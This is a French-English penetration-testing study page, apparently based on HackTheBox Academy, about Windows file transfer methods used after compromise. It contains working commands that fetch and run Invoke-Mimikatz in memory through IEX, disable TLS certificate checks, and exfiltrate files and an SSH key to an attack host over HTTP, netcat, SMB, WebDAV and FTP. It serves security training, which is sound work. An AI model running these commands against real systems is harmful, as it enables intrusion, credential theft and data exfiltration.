---
cover: ../../.gitbook/assets/imagewindows.png
coverY: 0
---

# Windows File Transfer Methods

## <mark style="color:red;">Introduction</mark>

Prenons par exemple l'attaque <mark style="color:orange;">**Astaroth**</mark> décrite dans un article de blog de Microsoft sur les menaces persistantes avancées (APT - **Advanced Persistent Threat**).

[https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)

***

{% hint style="info" %}
**Vocabulaire :**

1. <mark style="color:orange;">**Menace persistante avancée (APT)**</mark> <mark style="color:orange;">**:**</mark> Type d'attaque où un attaquant s'introduit dans un réseau sur une longue période, souvent sans être détecté.
{% endhint %}

L'article de blog commence par parler des menaces <mark style="color:orange;">**sans fichier**</mark>. Le terme "sans fichier" suggère qu'une menace n'utilise pas directement un fichier pour infecter un système. Au lieu de cela, elle s'appuie sur des outils légitimes intégrés au système pour mener une attaque. Cela ne signifie pas qu'il n'y a pas d'opération de transfert de fichiers. Comme discuté plus tard, le fichier n'est pas "présent" sur le disque, mais s'exécute en **mémoire**.

{% hint style="warning" %}
**Une menace "sans fichier"** n'utilise pas un fichier traditionnel, comme un exécutable qui se stocke sur le disque dur. À la place, elle exécute du code directement dans la mémoire (RAM), sans laisser de trace permanente sur le disque. Cela rend la détection plus difficile pour les antivirus, qui se concentrent souvent sur l'analyse des fichiers présents sur le disque.

Voici un exemple pour illustrer :

* Habituellement, un malware est un fichier exécutable (.exe) que l'antivirus peut détecter et supprimer parce qu'il est stocké sur le disque dur.
* Dans une attaque "sans fichier", un script ou une commande malveillante est exécuté directement en mémoire. Par exemple, un fichier JavaScript téléchargé peut être exécuté via un outil <mark style="color:orange;">**légitime de Windows, comme**</mark><mark style="color:orange;">**&#x20;**</mark>_<mark style="color:orange;">**WMIC**</mark>_<mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**ou**</mark><mark style="color:orange;">**&#x20;**</mark>_<mark style="color:orange;">**PowerShell**</mark>_<mark style="color:orange;">**,**</mark> sans jamais enregistrer le fichier sur le disque.

Ainsi, même si l'attaque nécessite des fichiers pour s'exécuter, ceux-ci sont chargés et gérés entièrement en mémoire, et ils disparaissent une fois que la machine redémarre.
{% endhint %}

Dans l'attaque Astaroth, les étapes suivantes ont généralement été suivies :

1. Un **lien malveillant** dans un e-mail de **spear-phishing** a conduit à un fichier <mark style="color:orange;">**LNK**</mark>.
2. En double-cliquant sur ce fichier LNK, l'outil <mark style="color:orange;">**WMIC**</mark> s'exécute avec le paramètre "/Format", permettant le téléchargement et l'exécution de code **JavaScript** malveillant.
3. Ce code JavaScript télécharge ensuite des charges utiles en abusant de l'outil <mark style="color:orange;">**Bitsadmin**</mark>.

{% hint style="warning" %}
#### Vocabulaire :

8. **Spear-phishing** : Attaque ciblée par e-mail où l'attaquant se fait passer pour une entité de confiance pour tromper la victime et la pousser à divulguer des informations sensibles ou à télécharger un logiciel malveillant.
9. **Fichier LNK** : Raccourci ou lien vers un autre fichier ou application.
10. **WMIC (Windows Management Instrumentation Command-line)** : Outil en ligne de commande sur Windows utilisé pour exécuter des tâches de gestion du système.
11. **Bitsadmin** : Outil Windows utilisé pour la gestion des transferts de fichiers en arrière-plan, souvent détourné par des attaquants pour télécharger discrètement des fichiers.\\
{% endhint %}

Toutes les charges utiles étaient encodées en **base64** et ont été décodées à l'aide de l'outil <mark style="color:orange;">**Certutil**</mark>, ce qui a permis de récupérer quelques fichiers <mark style="color:orange;">**DLL**</mark>. Ensuite, l'outil <mark style="color:orange;">**regsvr32**</mark> a été utilisé pour charger un des DLL décodés, qui a déchiffré et chargé d'autres fichiers, jusqu'à ce que la charge utile finale, Astaroth, soit injectée dans le processus <mark style="color:orange;">**Userinit**</mark>.

{% hint style="info" %}
**Vocabulaire :**

14. **Encodage base64** : Méthode de conversion de données binaires en texte ASCII pour les rendre plus faciles à transmettre dans des formats de texte. Exemple : Encodage d'un fichier en base64 pour l'envoyer par e-mail.
15. **Certutil** : Outil Windows pour la gestion des certificats de sécurité, souvent utilisé pour des opérations liées au chiffrement et au décodage.
16. **DLL (Dynamic Link Library)** : Fichiers contenant des fonctions et des ressources partagées utilisées par les applications Windows.
17. **regsvr32** : Outil Windows permettant de s'enregistrer ou de désenregistrer des fichiers DLL.
18. **Userinit** : Processus Windows démarrant automatiquement après la connexion d'un utilisateur, souvent ciblé pour y injecter des logiciels malveillants.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:red;">PowerShell Base64 Encode & Decode</mark>

<mark style="color:orange;">**Pwnbox Check SSH Key MD5 Hash**</mark>

{% code fullWidth="true" %}
```shell
md5sum id_rsa
```
{% endcode %}

<mark style="color:orange;">**Pwnbox Encode SSH Key to Base64**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ cat id_rsa | base64 -w 0;echo
```
{% endcode %}

{% hint style="warning" %}
**`base64 -w 0`** : Cette commande encode le contenu fourni en utilisant l'encodage Base64. Le flag `-w 0` signifie que la sortie sera produite sur une seule ligne sans retour à la ligne. Par défaut, `base64` insère un saut de ligne après 76 caractères, mais ici, avec `-w 0`, il supprime ces retours à la ligne.
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb>  [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0t...="))
```
{% endcode %}

{% hint style="info" %}
* <mark style="color:orange;">**`[IO.File]::WriteAllBytes`**</mark> :\
  Cette méthode statique (méthode de la classe `IO.File`) permet d'écrire un tableau d'octets dans un fichier. Le premier argument est le chemin du fichier où les données seront écrites, et le second argument est le tableau d'octets à écrire.
  * **"C:\Users\Public\id\_rsa"** : Le fichier sera enregistré dans le dossier public de l'utilisateur, sous le nom `id_rsa`.
  * **Tableau d'octets** : Le contenu du fichier sera un tableau d'octets représentant une clé privée SSH encodée en Base64.
* <mark style="color:orange;">**`[Convert]::FromBase64String`**</mark> :\
  Cette méthode convertit une chaîne encodée en Base64 en un tableau d'octets. La chaîne que tu vois entre guillemets est une version encodée de la clé privée SSH. Voici comment cela fonctionne :
{% endhint %}

<mark style="color:orange;">**Confirming the MD5 Hashes Match**</mark>

{% code fullWidth="true" %}
```powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```
{% endcode %}

{% hint style="warning" %}
Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
{% endhint %}

***

## <mark style="color:red;">PowerShell Web Downloads</mark>

PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`.&#x20;

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Method</strong></td><td><strong>Description</strong></td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0">OpenRead</a></td><td>Returns the data from a resource as a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0">Stream</a>.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0">OpenReadAsync</a></td><td>Returns the data from a resource without blocking the calling thread.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0">DownloadData</a></td><td>Downloads data from a resource and returns a Byte array.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0">DownloadDataAsync</a></td><td>Downloads data from a resource and returns a Byte array without blocking the calling thread.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0">DownloadFile</a></td><td>Downloads data from a resource to a local file.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0">DownloadFileAsync</a></td><td>Downloads data from a resource to a local file without blocking the calling thread.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0">DownloadString</a></td><td>Downloads a String from a resource and returns a String.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0">DownloadStringAsync</a></td><td>Downloads a String from a resource without blocking the calling thread.</td></tr></tbody></table>

<mark style="color:green;">**PowerShell DownloadFile Method**</mark>

<mark style="color:orange;">**File Download**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
{% endcode %}

<mark style="color:orange;">**PowerShell DownloadString - Fileless Method**</mark>

{% hint style="warning" %}
As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
{% endcode %}

`IEX` also accepts pipeline input.

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
{% endcode %}

{% hint style="info" %}
<mark style="color:orange;">**Le terme**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`IEX`**</mark> dans PowerShell est l'alias de la cmdlet **`Invoke-Expression`**. Cette cmdlet est utilisée pour évaluer et exécuter une chaîne de texte comme du code PowerShell. C'est un moyen de faire en sorte que du code soit interprété et exécuté en mémoire sans être stocké sur le disque.
{% endhint %}

<mark style="color:orange;">**PowerShell Invoke-WebRequest**</mark>

From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
{% endcode %}

Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239).&#x20;

<mark style="color:orange;">**Common Errors with PowerShell**</mark>

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

<div data-full-width="false"><img src="https://academy.hackthebox.com/storage/modules/24/IE_settings.png" alt="image" width="375"></div>

<mark style="color:orange;">**This can be bypassed using the parameter**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`-UseBasicParsing`**</mark><mark style="color:orange;">**.**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
{% endcode %}

{% hint style="danger" %}
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
{% endcode %}

***

## <mark style="color:red;">SMB Downloads</mark>

<mark style="color:orange;">**Create the SMB Server**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
{% endcode %}

To download a file from the SMB server to the current working directory, we can use the following command:

<mark style="color:orange;">**Copy a File from the SMB Server**</mark>

{% code fullWidth="true" %}
```powershell
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```
{% endcode %}

New versions of Windows block unauthenticated guest access, as we can see in the following command:

{% code overflow="wrap" fullWidth="true" %}
```powershell
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
{% endcode %}

To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:

<mark style="color:orange;">**Create the SMB Server with a Username and Password**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
{% endcode %}

<mark style="color:orange;">**Mount the SMB Server with Username and Password**</mark>

{% code fullWidth="true" %}
```powershell
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```
{% endcode %}

Note: You can also mount the SMB server if you receive an error when you use \`copy filename \\\IP\sharename\`.

{% hint style="warning" %}
1\. **Commande `copy \\192.168.220.133\share\nc.exe`** :

Cette commande tente de **copier un fichier** situé sur un partage réseau SMB.

* **`copy`** : La commande `copy` est utilisée pour copier des fichiers d'un emplacement à un autre.
* **`\\192.168.220.133\share\nc.exe`** : Ici, tu spécifies directement l'adresse du fichier à copier depuis un **partage réseau SMB**. L'IP `192.168.220.133` est l'adresse du serveur qui héberge le partage, et `share` est le nom du dossier partagé. Le fichier `nc.exe` est le fichier que tu veux copier.

Si tu exécutes cette commande et que le partage est public ou que tes informations d'identification sont déjà stockées dans la session, le fichier est copié directement sans avoir besoin de se connecter explicitement.

#### 2. **Commande `net use n: \\192.168.220.133\share /user:test test`** :

Cette commande est utilisée pour **mapper un partage réseau SMB** à une lettre de lecteur (ici, `n:`) et pour se connecter au partage en fournissant des **informations d'identification**.

* **`net use`** : C'est une commande qui permet d'établir une connexion à un partage réseau SMB et de mapper cette connexion à une lettre de lecteur locale.
* **`n:`** : C'est la lettre de lecteur que tu souhaites assigner au partage réseau. Une fois la commande exécutée avec succès, tu pourras accéder au partage réseau via `n:` comme s'il s'agissait d'un lecteur local.
* **`\\192.168.220.133\share`** : Comme précédemment, c'est l'adresse du partage réseau SMB.
* **`/user:test test`** : Ces options spécifient que tu veux te connecter au partage en utilisant le nom d'utilisateur `test` et le mot de passe `test`.
{% endhint %}



***

## <mark style="color:red;">FTP Downloads</mark>

<mark style="color:orange;">**Installing the FTP Server Python3 Module - pyftpdlib**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ sudo pip3 install pyftpdlib
```
{% endcode %}

Then we can specify port number 21 because, by default, `pyftpdlib` uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.

<mark style="color:orange;">**Setting up a Python3 FTP Server**</mark>

{% code fullWidth="true" %}
```sh
mrroboteLiot@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```
{% endcode %}

After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.

<mark style="color:orange;">**Transfering Files from an FTP Server Using PowerShell**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
{% endcode %}

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

<mark style="color:orange;">**Create a Command File for the FTP Client and Download the Target File**</mark>

{% code fullWidth="true" %}
```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```
{% endcode %}

{% hint style="info" %}
**`-n`**&#x20;

désactive la connexion automatique, ce qui est utile si tu veux contrôler manuellement les étapes de connexion, comme fournir des informations d'identification spécifiques via un fichier de commandes (`-s:ftpcommand.txt`).

**-s**

**.txt** _(script file)_ :

* Spécifie un fichier contenant une série de commandes FTP à exécuter. Ici, le fichier `ftpcommand.txt` contient toutes les commandes nécessaires à l'automatisation de la session FTP (ouvrir une connexion, s'authentifier, télécharger un fichier, etc.).
* Le préfixe `-s:` est utilisé pour indiquer au client FTP que les commandes doivent être lues à partir de ce fichier plutôt que d'être tapées manuellement.
{% endhint %}

***

## <mark style="color:red;">Upload Operations</mark>

### <mark style="color:blue;">PowerShell Base64 Encode & Decode</mark>

<mark style="color:orange;">**Encode File Using PowerShell**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3....o=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```
{% endcode %}

We copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.

<mark style="color:orange;">**Decode Base64 String in Linux**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ echo IyB..o= | base64 -d > hosts
```
{% endcode %}

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ md5sum hosts 

3688374325b992def12793500307566d  hosts
```
{% endcode %}

***

### <mark style="color:blue;">PowerShell Web Uploads</mark>

PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function.&#x20;

<mark style="color:orange;">**Installing a Configured WebServer with Upload**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```
{% endcode %}

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endcode %}

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

<mark style="color:orange;">**PowerShell Script to Upload a File to Python Upload Server**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```
{% endcode %}

#### <mark style="color:orange;">PowerShell Base64 Web Upload</mark>

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
{% endcode %}

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

{% code fullWidth="true" %}
```sh
mrroboteLiot@htb[/htb]$ nc -lvnp 8000
```
{% endcode %}

{% code fullWidth="true" %}
```sh
mrroboteLiot@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```
{% endcode %}

***

### <mark style="color:blue;">SMB Uploads</mark>

Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.

{% hint style="warning" %}
For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).
{% endhint %}

An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

When you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.

![Image](https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png)

<mark style="color:orange;">**Configuring WebDav Server**</mark>

To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.

<mark style="color:orange;">**Installing WebDav Python modules**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ sudo pip3 install wsgidav cheroot
```
{% endcode %}

<mark style="color:orange;">**Using the WebDav Python module**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
{% endcode %}

<mark style="color:orange;">**Connecting to the Webdav Share**</mark>

Now we can attempt to connect to the share using the `DavWWWRoot` directory.

{% code fullWidth="true" %}
```powershell
C:\htb> dir \\192.168.49.128\DavWWWRoot
```
{% endcode %}

Note: `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

<mark style="color:orange;">**Uploading Files using SMB**</mark>

{% code fullWidth="true" %}
```powershell
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
{% endcode %}

Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

***

### <mark style="color:blue;">FTP Uploads</mark>

Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
```
{% endcode %}

Now let's use the PowerShell upload function to upload a file to our FTP Server.

<mark style="color:orange;">**PowerShell Upload File**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
{% endcode %}

<mark style="color:orange;">**Create a Command File for the FTP Client to Upload a File**</mark>

{% code fullWidth="true" %}
```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
{% endcode %}
